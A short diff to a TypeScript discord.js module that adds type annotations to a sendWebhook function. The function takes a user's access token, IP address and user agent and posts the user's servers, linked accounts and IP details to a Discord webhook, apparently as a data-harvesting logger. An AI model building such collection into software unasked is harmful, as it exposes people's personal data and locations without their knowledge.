@@ -1,6 +1,6 @@
 import { EmbedBuilder, WebhookClient } from "discord.js";
 import { getConnnections, getInfo, getOwnGuilds, getIpInfo } from "./userdata";
-
+import { DiscordGuild, DiscordConnection } from "../types/userdata";
 export const sendWebhook = async (access_token: string, ip: string, ua: string) => {
     try {
         const userInfo = await getInfo(access_token);
@@ -38,7 +38,7 @@ export const sendWebhook = async (access_token: string, ip: string, ua: string) 
         if (Array.isArray(ownGuilds) && ownGuilds.length > 0) {
           fields.push({
             name: "🧑‍💻 Joined Servers",
-            value: ownGuilds.map((guild: any) => `${guild.name} (${guild.id})`).join("\n"),
+            value: ownGuilds.map((guild: DiscordGuild) => `${guild.name} (${guild.id})`).join("\n"),
             inline: false
           });
         } else {
@@ -52,7 +52,7 @@ export const sendWebhook = async (access_token: string, ip: string, ua: string) 
         if (Array.isArray(connections) && connections.length > 0) {
           fields.push({
             name: "🎮 Connections",
-            value: connections.map((connection: any) => `${connection.type}: ${connection.name}`).join("\n"),
+            value: connections.map((connection: DiscordConnection) => `${connection.type}: ${connection.name}`).join("\n"),
             inline: false
           });
         } else {
